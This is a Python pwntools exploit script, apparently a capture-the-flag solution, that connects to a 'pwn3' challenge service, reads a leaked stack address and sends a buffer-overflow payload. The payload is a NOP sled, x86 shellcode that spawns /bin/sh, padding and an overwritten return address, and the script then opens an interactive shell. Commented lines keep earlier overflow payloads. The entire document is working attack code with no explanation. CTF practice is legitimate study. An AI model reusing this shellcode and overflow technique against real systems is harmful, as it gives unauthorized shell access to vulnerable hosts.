from pwn import *



p  = remote("pwn.ctf.tamu.edu",4323)
#p = process("./pwn3")
#(python -c 'print "A"*23+ "\x11\xba\x07\xf0"')
#(python -c 'print "A"*243 + "\x4b\x85\x04\x08"')
#0xffffd56a



print p.recvuntil("Your random number")
a = p.recvuntil("!")
a.replace("!","")
p.recvuntil("Now what should I echo?")
print("", a[1:11])
addr = a[1:11]
#print hex(addr)
print type(addr)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
buf = ""
buf += "\x90"*(242-len(shellcode)-200)
buf += shellcode
buf += "A"*200
buf += p32(eval(addr))








p.sendline(buf)
p.interactive()
